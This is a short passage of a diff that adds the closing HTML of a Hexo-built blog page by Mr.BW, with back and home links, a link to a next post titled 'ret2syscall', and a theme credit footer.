+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/06/12/ret2syscall/">ret2syscall</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
